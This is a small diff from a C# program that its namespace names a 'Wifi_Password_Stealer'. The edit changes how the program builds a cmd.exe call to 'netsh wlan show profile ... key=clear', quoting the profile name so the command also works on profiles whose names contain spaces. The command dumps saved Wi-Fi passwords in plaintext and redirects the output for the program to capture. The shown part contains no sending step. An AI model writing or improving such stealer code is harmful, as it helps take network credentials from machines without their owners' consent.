@@ -32,7 +32,7 @@ namespace Wifi_Password_Stealer
             {
                 Process p = new Process();
                 p.StartInfo.FileName = "cmd.exe";
-                p.StartInfo.Arguments = "/c netsh wlan show profile "+profile+" key=clear";
+                p.StartInfo.Arguments = "/c netsh wlan show profile "+'"'+profile+'"'+" key=clear";
                 p.StartInfo.UseShellExecute = false;
                 p.StartInfo.RedirectStandardOutput = true;
                 p.StartInfo.CreateNoWindow = false;
